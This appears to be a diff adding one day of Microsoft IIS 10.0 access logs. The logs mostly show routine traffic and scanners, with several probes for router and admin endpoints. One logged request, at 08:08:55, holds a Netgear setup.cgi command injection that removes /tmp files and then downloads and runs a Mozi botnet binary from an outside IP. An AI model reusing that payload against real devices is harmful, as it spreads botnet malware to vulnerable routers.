@@ -1,0 +1,149 @@
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 00:52:08
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 00:52:08 192.168.3.87 GET / - 80 - 79.103.85.210 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36 - 301 0 0 300
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 01:42:16
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 01:42:16 192.168.3.87 GET / - 80 - 104.244.168.11 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:76.0)+Gecko/20100101+Firefox/76.0 - 301 0 0 435
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 02:53:39
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 02:53:39 192.168.3.87 GET / - 80 - 46.174.191.29 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-GB;+rv:1.9.1b2)+Gecko/20081201+Firefox/3.1b2 - 301 0 0 324
+2020-11-19 02:54:17 192.168.3.87 GET / - 80 - 78.108.177.50 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/55.0.2883.87+Safari/537.36 - 301 0 0 28
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 06:24:44
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 06:24:44 192.168.3.87 GET / - 80 - 46.174.191.29 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-GB;+rv:1.9.1b2)+Gecko/20081201+Firefox/3.1b2 - 301 0 0 289
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 06:58:08
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 06:58:08 192.168.3.87 GET / - 80 - 78.108.177.52 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/55.0.2883.87+Safari/537.36 - 301 0 0 279
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 07:15:54
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 07:15:54 192.168.3.87 GET / - 80 - 110.77.190.177 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_11_6)+AppleWebKit/601.7.7+(KHTML,+like+Gecko)+Version/9.1.2+Safari/601.7.7 - 301 0 0 227
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 08:08:55
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 08:08:55 192.168.3.87 GET /setup.cgi next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.246.209.228:51820/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 80 - 222.246.209.228 - - 404 0 2 424
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 08:32:16
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 08:32:16 192.168.3.87 GET / - 80 - 45.15.143.171 libwww-perl/6.49 - 301 0 0 305
+2020-11-19 08:32:16 192.168.3.87 GET /index.html/ - 80 - 45.15.143.171 libwww-perl/6.49 - 200 0 0 181
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 09:14:19
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 09:14:19 192.168.3.87 GET / - 80 - 220.134.104.125 Mozilla/5.0 - 301 0 0 831
+2020-11-19 09:20:57 192.168.3.87 GET / - 80 - 176.120.37.198 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36 - 301 0 0 52
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 09:44:08
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 09:44:08 192.168.3.87 GET / - 80 - 78.108.177.52 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/55.0.2883.87+Safari/537.36 - 301 0 0 292
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 10:21:42
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 10:21:42 192.168.3.87 GET /config/getuser index=0 80 - 104.244.168.11 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:76.0)+Gecko/20100101+Firefox/76.0 - 404 0 2 338
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 11:13:21
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 11:13:21 192.168.3.87 GET / - 80 - 94.182.44.106 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_11_6)+AppleWebKit/601.7.7+(KHTML,+like+Gecko)+Version/9.1.2+Safari/601.7.7 - 301 0 0 262
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 11:57:43
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 11:57:43 192.168.3.87 GET / - 80 - 186.86.218.150 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/52.0.2743.116+Safari/537.36 - 301 0 0 397
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 12:38:33
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 12:38:33 192.168.3.87 GET / - 80 - 74.82.47.4 - - 301 0 0 424
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 12:54:51
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 12:54:51 192.168.3.87 GET / - 80 - 220.135.130.235 Mozilla/5.0 - 301 0 0 711
+2020-11-19 13:06:54 192.168.3.87 GET / - 80 - 190.72.166.13 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/52.0.2743.116+Safari/537.36 - 301 0 0 225
+2020-11-19 13:16:47 192.168.3.87 GET / - 80 - 46.174.191.28 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-GB;+rv:1.9.1b2)+Gecko/20081201+Firefox/3.1b2 - 301 0 0 85
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 14:06:10
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 14:06:10 192.168.3.87 GET / - 80 - 66.151.211.50 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:55.0)+Gecko/20100101+Firefox/55.0 - 301 0 0 607
+2020-11-19 14:06:10 192.168.3.87 GET /index.html/ - 80 - 66.151.211.50 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:55.0)+Gecko/20100101+Firefox/55.0 - 200 0 0 327
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 14:34:07
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 14:34:07 192.168.3.87 GET / - 80 - 181.194.195.50 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/52.0.2743.116+Safari/537.36 - 301 0 0 404
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 16:25:29
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 16:25:29 192.168.3.87 GET / - 80 - 78.108.177.53 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/55.0.2883.87+Safari/537.36 - 301 0 0 428
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 16:49:54
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 16:49:54 192.168.3.87 POST /GponForm/diag_Form images/ 80 - 222.140.174.239 Hello,+World - 404 0 2 391
+2020-11-19 16:59:00 192.168.3.87 POST /pingkon.php q=query 80 - 173.233.87.152 Mozila/4.0 http://www.google.com 404 0 2 101
+2020-11-19 17:09:59 192.168.3.87 GET / - 80 - 46.174.191.28 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-GB;+rv:1.9.1b2)+Gecko/20081201+Firefox/3.1b2 - 301 0 0 53
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 17:29:45
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 17:29:45 192.168.3.87 GET / - 80 - 24.104.77.14 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 - 301 0 0 279
+2020-11-19 17:29:45 192.168.3.87 GET /index.html/ - 80 - 24.104.77.14 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 - 200 0 0 319
+2020-11-19 17:29:46 192.168.3.87 GET /HNAP1/ - 80 - 24.104.77.14 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 http://91.138.38.58:8080/ 404 0 2 301
+2020-11-19 17:34:50 192.168.3.87 GET /hudson - 80 - 192.241.235.214 Mozilla/5.0+zgrab/0.x - 404 0 2 178
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 19:29:22
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 19:29:22 192.168.3.87 GET /admin-scripts.asp - 80 - 194.30.34.235 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36 - 404 0 2 147
+2020-11-19 19:29:22 192.168.3.87 GET /admin-scripts.asp - 80 - 194.30.34.235 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36 - 404 0 2 64
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 19:51:09
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 19:51:09 192.168.3.87 GET / - 80 - 167.248.133.37 - - 301 0 0 291
+2020-11-19 19:51:09 192.168.3.87 GET / - 80 - 167.248.133.37 Mozilla/5.0+(compatible;+CensysInspect/1.1;++https://about.censys.io/) - 301 0 0 117
+2020-11-19 19:51:09 192.168.3.87 GET /index.html/ - 80 - 167.248.133.37 Mozilla/5.0+(compatible;+CensysInspect/1.1;++https://about.censys.io/) - 200 0 0 180
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 20:44:54
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 20:44:54 192.168.3.87 GET / - 80 - 78.108.177.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/55.0.2883.87+Safari/537.36 - 301 0 0 319
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 21:28:05
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 21:28:05 192.168.3.87 GET /config/getuser index=0 80 - 2.57.122.186 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:76.0)+Gecko/20100101+Firefox/76.0 - 404 0 2 328
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 21:58:29
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 21:58:29 192.168.3.87 GET / - 80 - 46.174.191.32 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-GB;+rv:1.9.1b2)+Gecko/20081201+Firefox/3.1b2 - 301 0 0 279
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 22:27:40
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 22:27:40 192.168.3.87 GET / - 80 - 78.108.177.52 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/55.0.2883.87+Safari/537.36 - 301 0 0 217
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2020-11-19 23:24:34
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2020-11-19 23:24:34 192.168.3.87 GET /config/getuser index=0 80 - 104.244.168.11 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:76.0)+Gecko/20100101+Firefox/76.0 - 404 0 2 317
